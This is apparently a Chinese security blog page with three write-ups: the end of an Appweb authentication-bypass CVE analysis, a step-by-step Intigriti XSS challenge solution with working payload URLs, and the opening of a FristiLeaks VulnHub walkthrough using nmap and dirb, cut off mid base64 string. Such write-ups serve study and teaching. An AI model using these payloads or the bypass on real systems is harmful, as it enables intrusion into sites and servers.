(!auth-&gt;parent || (verifyUser = auth-&gt;parent-&gt;verifyUser) == 0) &#123;</span><br><span class="line">            verifyUser = auth-&gt;store-&gt;verifyUser;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!verifyUser) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;username &amp;&amp; *auth-&gt;username) &#123;</span><br><span class="line">        /* If using auto-login, replace the username */</span><br><span class="line">        username = auth-&gt;username;</span><br><span class="line">        password = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(verifyUser)(conn, username, password)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) &#123;</span><br><span class="line">        if ((session = httpCreateSession(conn)) == 0) &#123;</span><br><span class="line">            /* Too many sessions */</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">    rx-&gt;authenticated = 1;</span><br><span class="line">    rx-&gt;authenticateProbed = 1;</span><br><span class="line">    conn-&gt;username = sclone(username);</span><br><span class="line">    conn-&gt;encoded = 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一函数会检查username是否为空，当session已被分配时，<code>password</code>指针可以为空</p>
<p>为了能够绕过身份验证，我们需要能够传递空密码指针，幸运的是，对于表单和摘要身份验证，用于解析身份验证详细信息的函数（第1666行）将允许我们设置空密码指针，并且即使返回错误，最终也不会被authCondition检查，允许我们完全绕过身份验证，利用这个的唯一条件是知道hashmap中的用户名。</p>
<p>为了克服这个限制，必须考虑到散列映射的大小通常很小，并且散列映射中使用的散列算法（FNV）很弱：尝试次数有限，可能会发现冲突，并且登录不知道有效的用户名（未经测试）</p>
<p>reference：<br><a href="https://blog.csdn.net/weixin_42936566/article/details/87120710" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42936566/article/details/87120710</a><br><a href="https://ssd-disclosure.com/archives/3676" target="_blank" rel="noopener">https://ssd-disclosure.com/archives/3676</a><br><a href="https://github.com/embedthis/appweb/issues/610" target="_blank" rel="noopener">https://github.com/embedthis/appweb/issues/610</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/cve/">cve</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/09/vulnerable/intigriti xss challenge/"><span>Intigriti XSS Challenge - Solution and problem solving approach</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/09/vulnerable/intigriti xss challenge/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-09T08:26:05.142Z">
          2019-05-09
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Intigriti-XSS-Challenge-Solution-and-problem-solving-approach"><a href="#Intigriti-XSS-Challenge-Solution-and-problem-solving-approach" class="headerlink" title="Intigriti XSS Challenge - Solution and problem solving approach"></a>Intigriti XSS Challenge - Solution and problem solving approach</h1><p><strong>原文链接：</strong><a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
<p>这是基于chrome的漏洞，但是google确实🐮🍺，反应速度极快，我准备复现的时候已经修复了，不过我在ipad上的Google浏览器实验时成功了</p>
<p>Intigriti发布了一个有趣的小XSS挑战，它要求创建一个特殊的URL，既可以用来分配iframe的SRC，也可以发送到一个eval调用来弹出一个警报（document.domain），这是挑战的目标。但是我们如何实现？让我们回到开始，一步步分析。</p>
<p>注意：最终漏洞仅适用于Chrome，因此如果您想要跟进，我建议您使用chrome。</p>
<p>主要代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|&lt;|&gt;/gi, &quot;forbidden&quot;);#document.location.hash打印出‘#’后的内容</span><br><span class="line">  const iframe = document.createElement(&quot;iframe&quot;); iframe.src = url; document.body.appendChild(iframe);</span><br><span class="line">  iframe.onload = function()&#123; window.addEventListener(&quot;message&quot;, executeCtx, false);&#125;</span><br><span class="line">  function executeCtx(e) &#123;</span><br><span class="line">    if(e.source == iframe.contentWindow)&#123;</span><br><span class="line">      e.data.location = window.location;</span><br><span class="line">      Object.assign(window, e.data);</span><br><span class="line">      eval(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li>代码获取hash当前页面的url（＃后面的任何内容），从中解码URL实体，然后用字符串“forbidden”替换“script”，“&lt;”或“&gt;”的任何实例。结果分配给url变量</li>
<li>iframe是在当前页面创建，其src是url刚刚创建，有效地加载一个URL到iframe</li>
<li>当iframe完成加载时，我们开始监听message事件并executeCtx在提出时甚至调用</li>
<li>该executeCtx功能已定义</li>
</ol>
<ul>
<li><p>该功能确保事件来自 iframe</p>
</li>
<li><p>本次活动的有效载荷的location属性写入当前windows的location，大概是为了再次保护重定向另一个URL</p>
</li>
<li><p>有效载荷对象中的每个属性都分配给window带有Object.assign(window, e.data)行（这意味着我发送的任何内容executeCtx都将在window…中定义…非常有趣）</p>
</li>
<li><p>url变量被eval</p>
</li>
</ul>
<p>阅读完该代码后，我的第一个问题是：<code>message</code>事件是什么？事实证明，有一个用于跨源通信的API <code>window.postMessage</code>，它允许您将对象发送给收听该<code>message</code>事件的任何人。</p>
<h2 id="一步一步的利用"><a href="#一步一步的利用" class="headerlink" title="一步一步的利用"></a>一步一步的利用</h2><p>绕过过滤，尝试利用base64<br><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=，这是base64</a> for <code>&lt;script&gt;alert(&#39;hi&#39;);&lt;/script&gt;</code>，我得到了我的<code>alert！</code>但是<code>alert(document.domain)</code>从内部不起作用，iframe因为它是一个数据URL，并且没有域。我们有一个alert盒子，但我想从外面弹出它，所以我远远没有结束。</p>
<p>Posting a message to the parent window</p>
<p>我们的目标是执行<code>eval（url）</code>，我现在需要去post一个message从而执行<code>executeCtx</code>函数。所以我尝试刚了解到的这个api并使用以下脚本：<code>&lt;script&gt;window.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>，<code>postMessage</code>函数的第二个参数是目标源，我明白使用<code>&#39;*&#39;</code>是一个坏的尝试，因为它允许任何人可以截断我的message但是我并不在意毕竟这只是个挑战，所以结果就是构造了如下的url：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucG9zdE1lc3NhZ2UoInRlc3QiLCAiKiIpPC9zY3JpcHQ+</a></p>
</blockquote>
<p>啥都没有。我在<code>executeCtx</code>下了断点但似乎没有命中。让我们回到<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">MDN</a>了解<code>postMessage</code>函数是如何调用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, targetOrigin, [transfer]);</span><br><span class="line"></span><br><span class="line">targetWindow</span><br><span class="line">A reference to the window that will receive the message. Methods for obtaining such a reference include:</span><br><span class="line">- window.open (to spawn a new window and then reference it),</span><br><span class="line">- window.opener (to reference the window that spawned this one),</span><br><span class="line">- HTMLIFrameElement.contentWindow (to reference an embedded &lt;iframefrom its parent window),</span><br><span class="line">- window.parent (to reference the parent </span><br><span class="line">window from within an embedded &lt;iframe&gt;), or</span><br><span class="line">- window.frames + an index value (named or numeric).</span><br></pre></td></tr></table></figure></p>
<p>所以<code>postMessage</code>必须在window能够接收message的情况下被调用。于是调整我们的payload：<code>&lt;script&gt;window.parent.postMessage(&quot;test&quot;, &quot;*&quot;)&lt;/script&gt;</code>。我想要message能够被主视窗接收，所以<code>iframe</code>就是<code>windows.parent</code>，新的url如下：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKCJ0ZXN0IiwgIioiKTwvc2NyaXB0Pg</a></p>
</blockquote>
<p>好的！现在我得到了一个来自<code>executeCtx</code>的js错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(index):31 Uncaught TypeError: Failed to set an indexed property on &apos;Window&apos;: Index property setter is not supported.</span><br><span class="line">    at Function.assign (&lt;anonymous&gt;)</span><br><span class="line">    at executeCtx ((index):31)</span><br></pre></td></tr></table></figure></p>
<p>这是因为数据是一个字符串所以我们遇到了<code>Object.assign(window, e.data);</code>问题。让我们先发送一个空对象。payload如下：<code>&lt;script&gt;window.parent.postMessage({}, &quot;*&quot;)&lt;/script&gt;</code>，转换为url如下：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</a></p>
</blockquote>
<p>结果是<code>Uncaught SyntaxError: Unexpected end of input</code>由<code>eval(url)</code>这一行抛出。所以如下的值<code>data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+</code>是无法去解析url变量中的有效js。</p>
<h2 id="将url转为js"><a href="#将url转为js" class="headerlink" title="将url转为js"></a>将url转为js</h2><p>现在我们的目标是让<code>eval(url)</code>解析有效的js（还没到思考xss的时候）。我知道有很多东西都能作为有效的js所以我跳出这个挑战尝试运行：<code>eval(&#39;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ+&#39;)</code>在我的控制台。如期望一样发生了相同的错误。“Unexpected end of input” 意味着解析器期望另一个token但已经到达了字符串的末尾。我的url是以<code>+</code>结束，对于JS的表达式而言它没有什么实际意义，所以让我们将他剔除。这会让我们的base64字符串无效但我们之后会回到这个地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ&apos;)</span><br><span class="line">VM42:1 Uncaught ReferenceError: text is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:6)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
<p>什么？<code>text</code> is not defined？起先我不知道<code>text</code>来自于哪儿，但我回看的时候。。。好吧。然后我令<code>text=1</code>再次执行<code>eval</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = 1</span><br><span class="line">1</span><br><span class="line">&gt; eval(&apos;data:text/html;base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ&apos;)</span><br><span class="line">VM70:1 Uncaught ReferenceError: html is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:11)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
<p>哦！<code>html</code>？对了！url未带<code>+</code>结束是一个有效的JS。还是不懂？下面是url缩进之后：</p>
<blockquote>
<p>data: // a label for a goto</p>
<p>text/html; // divides the variable text by the variable html</p>
<p>base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ // evalutes the base64 variable and the PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt9LCAiKiIpPC9zY3JpcHQ variable then returns the latter (see , operator)</p>
</blockquote>
<p>它肯定不是连贯的代码，但它是有效的JavaScript代码。字符串末尾的<code>+</code>只是一个简单的base64组件。我不断改进我的payload，只要遇到<code>+</code>则将他丢进垃圾桶直到以字母为结尾的base64编码能够是他成为有效的变量名</p>
<h2 id="最后考虑XSS"><a href="#最后考虑XSS" class="headerlink" title="最后考虑XSS"></a>最后考虑XSS</h2><p>所以如何让<code>eval</code>执行js呢，如何放入<code>alert(document.domain)</code>？我们回到<a href="https://developer.mozilla.org/" target="_blank" rel="noopener">MDN</a>了解data协议并寻找哪里能放入我的<code>alert</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">The mediatype is a MIME type string, such as &apos;image/jpeg&apos; for a JPEG image file. If omitted, defaults to text/plain;charset=US-ASCII</span><br></pre></td></tr></table></figure></p>
<p><code>; charset = US-ASCII</code>引起了我的注意。也许我可以把我的有效载荷放在那里？它甚至看起来像一个JavaScript变量赋值！所以我在我的控制台中尝试这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; text = 1</span><br><span class="line">1</span><br><span class="line">&gt; html = 1</span><br><span class="line">1</span><br><span class="line">&gt; eval(&apos;data:text/html;charset=alert(1);base64,whatever&apos;)</span><br><span class="line">Uncaught ReferenceError: base64 is not defined</span><br><span class="line">    at eval (eval at &lt;anonymous&gt; ((index):1), &lt;anonymous&gt;:1:33)</span><br><span class="line">    at &lt;anonymous&gt;:1:1</span><br></pre></td></tr></table></figure></p>
<p>是的！<code>alert</code>成功pop了！虽然它抱怨base64没有被定义但是alert成功了那么又何必在意呢？是时候转向网站了！我更改我的payload为<code>&lt;script&gt;window.parent.postMessage({text:1, html:1, base64:1}, &quot;*&quot;)&lt;/script&gt;hi intigriti</code>记住<code>Object.assign(window, e.data)</code>这行将携带我post的message从而对<code>text</code>和<code>html</code>变量进行定义（我定义了base64但那不重要），末尾的<code>hi intigriti</code>可以逃离base64编码造成的末尾<code>+</code>存在。<br>于是url变为：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p>但是。。。并没有奏效<br>data URLs最棒的一点就是你可以将他们放在你的地址栏然后查看结果，这一data URL：</p>
<blockquote>
<p>data:text/html;charset=alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</p>
</blockquote>
<p>回显的信息是“This site can’t be reached”，研究了一阵我发现<code>alert(1)</code>的括号搞砸了这一切</p>
<h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p>我花了大量的时间努力寻求不需要括号去调用函数的可替代方式直到我发现或许我并不需要<code>charset=</code>，或许移除它就能绕过破坏我url的字符验证。现在尝试：</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(1);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p><code>alert(1)</code>成功了！，最后稍微调整一下</p>
<blockquote>
<p><a href="https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp" target="_blank" rel="noopener">https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp</a></p>
</blockquote>
<p><img src="https://dee-see.github.io/images/intigriti_xss_victory.png" alt=""></p>
<p><strong>注意</strong>：早上我升级了我的chrome，上述的方法100%不奏效了。我并没有额外的测试但我认为是因为<code>iframe</code>是在<code>message</code>事件监听被启用前调用的。所以添加一个<code>setTimeout</code>去延迟<code>postMessage</code>调用可能会修复这个问题，这一建议由<a href="https://twitter.com/ephreet1/status/1124220724770738176" target="_blank" rel="noopener">@ephreet</a>.提出</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为xss挑战，这有大量的代码审计。下面就是我的主要步骤：</p>
<ul>
<li>理解代码是如何运行的将有很大帮助</li>
<li>不要过多关注目标，而是要有计划的针对中间步骤</li>
<li>当你对要解决的挑战手足无措时不要紧张，解决好每一步，答案便会逐渐清晰</li>
</ul>
<p>谢谢<a href="https://twitter.com/intigriti/" target="_blank" rel="noopener">@intigriti</a>我玩得很开心！恭喜大家，祝你们好运！</p>
<h2 id="什么是data-url-schema"><a href="#什么是data-url-schema" class="headerlink" title="什么是data url schema"></a>什么是data url schema</h2><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p>
<h3 id="Data-URI的格式规范"><a href="#Data-URI的格式规范" class="headerlink" title="Data URI的格式规范,"></a>Data URI的格式规范,</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;&lt;encoding&gt;],&lt;encoded data&gt;</span><br><span class="line"></span><br><span class="line">1.  data ：协议名称；</span><br><span class="line"></span><br><span class="line">2.  [&lt;mime type&gt;] ：可选项，数据类型（image/png、text/plain等）</span><br><span class="line"></span><br><span class="line">3.  [;charset=&lt;charset&gt;] ：可选项，源文本的字符集编码方式</span><br><span class="line"></span><br><span class="line">4.  [;&lt;encoding&gt;] ：数据编码方式（默认US-ASCII，BASE64两种）</span><br><span class="line"></span><br><span class="line">5.  ,&lt;encoded data&gt; ：编码后的数据</span><br></pre></td></tr></table></figure>
<p>目前，Data URI scheme支持的类型有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,                            文本数据</span><br><span class="line">data:text/plain,                    文本数据</span><br><span class="line">data:text/html,                  HTML代码</span><br><span class="line">data:text/html;base64,            base64编码的HTML代码</span><br><span class="line">data:text/css,                    CSS代码</span><br><span class="line">data:text/css;base64,              base64编码的CSS代码</span><br><span class="line">data:text/javascript,              Javascript代码</span><br><span class="line">data:text/javascript;base64,        base64编码的Javascript代码</span><br><span class="line">data:image/gif;base64,            base64编码的gif图片数据</span><br><span class="line">data:image/png;base64,            base64编码的png图片数据</span><br><span class="line">data:image/jpeg;base64,          base64编码的jpeg图片数据</span><br><span class="line">data:image/x-icon;base64,          base64编码的icon图片数据</span><br></pre></td></tr></table></figure></p>
<p>参考链接：<a href="https://www.jianshu.com/p/ea49397fcd13" target="_blank" rel="noopener">https://www.jianshu.com/p/ea49397fcd13</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/xss/">xss</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/07/靶机/FristiLeak/"><span>vulnhub--FristiLeaks v1.3</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/07/靶机/FristiLeak/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-07T14:43:20.087Z">
          2019-05-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="FristiLeaks-v1-3"><a href="#FristiLeaks-v1-3" class="headerlink" title="FristiLeaks v1.3"></a>FristiLeaks v1.3</h1><p>按要求将mac地址改为<code>08:00:27:A5:A6:76</code><br><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_1.jpg" alt=""></p>
<ul>
<li>主机发现</li>
</ul>
<p>两种方式：</p>
<ol>
<li><code>nmap -sP 192.168.199.0/24</code></li>
<li><code>netdiscover -r 192.168.199.0/24</code></li>
</ol>
<ul>
<li>端口扫描</li>
</ul>
<blockquote>
<p>nmap -sS -sV -p1-65535 192.168.199.174 -A</p>
</blockquote>
<ul>
<li>扫描结果</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/cola /sisi /beer</span><br><span class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
<ul>
<li>访问</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_6.jpg" alt=""></p>
<ul>
<li>主页没什么附加链接，于是访问robots给出的三个目录，都是同一张图</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_8.jpg" alt=""></p>
<ul>
<li>很烦，回到主页面，说到一句话<strong>KEEP CALM AND DRINK FRISTI</strong>，于是我们尝试附加上<strong>fristi</strong>再进行目录爆破</li>
<li><code>dirb http://192.168.199.174/fristi/</code></li>
<li>得到了两个目录：</li>
</ul>
<p>index.php<br>uploads/index.html</p>
<ul>
<li>index.php是一个登陆框</li>
</ul>
<p><img src="https://raw.githubusercontent.com/lifeand/pic/master/ctf2_11.jpg" alt=""></p>
<ul>
<li>不是弱密码，查看网页源码，发现了一串base64</li>
</ul>
<blockquote>
<p>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx<br>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl<br>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw<br>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f<br>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ<br>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb<br>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd<br>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU<br>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5<br>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1<br>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq<br>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg<br>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws<br>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl<br>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK<br>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q<br>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34<br>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe<br>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH<br>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk<br>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3